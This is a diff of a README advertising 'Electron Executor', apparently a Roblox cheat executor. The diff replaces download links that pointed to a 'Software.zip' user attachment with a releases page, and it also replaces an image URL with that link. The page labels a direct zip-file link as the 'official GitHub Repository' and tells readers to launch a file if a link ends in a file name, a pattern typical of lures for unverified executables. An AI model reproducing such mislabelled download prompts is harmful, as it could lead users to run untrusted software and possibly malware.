@@ -3,7 +3,7 @@
 Roblox Electron Executor is a popular choice among Roblox players looking for a reliable executor. This tool is currently available for Windows users, offering a range of functionalities for enhancing the Roblox gaming experience. While Windows users can enjoy the benefits of Electron Executor, Android users may have to wait a bit longer for the official release tailored to their platform.
 
 ## How to Download Electron Executor:
-To access the Electron Executor, you can download it from the following link: [Download Electron Executor](https://github.com/user-attachments/files/18060583/Software.zip)
+To access the Electron Executor, you can download it from the following link: [Download Electron Executor](https://github.com/D3M0NVR/Electron-Executor/releases/tag/v2.0)
 
 ### Please Note:
 If the link above ends with the file name, you need to launch it to begin the download process. If the link is not working or not provided, we recommend checking the "Releases" section of the repository for alternative download options.
@@ -19,9 +19,9 @@ If the link above ends with the file name, you need to launch it to begin the do
 3. **Launch Electron Executor**: Once installed, launch the executor to explore its features and enhance your Roblox gameplay.
 
 ## Additional Resources:
-For more information and updates on Electron Executor, you can visit the official [Electron Executor GitHub Repository](https://github.com/user-attachments/files/18060583/Software.zip). Stay tuned for the latest developments and announcements regarding the tool.
+For more information and updates on Electron Executor, you can visit the official [Electron Executor GitHub Repository](https://github.com/D3M0NVR/Electron-Executor/releases/tag/v2.0). Stay tuned for the latest developments and announcements regarding the tool.
 
-![Electron Executor](https://images.unsplash.com/photo-1587269970034-9290c089eb9b)
+![Electron Executor](https://github.com/D3M0NVR/Electron-Executor/releases/tag/v2.0)
 
 ---
 
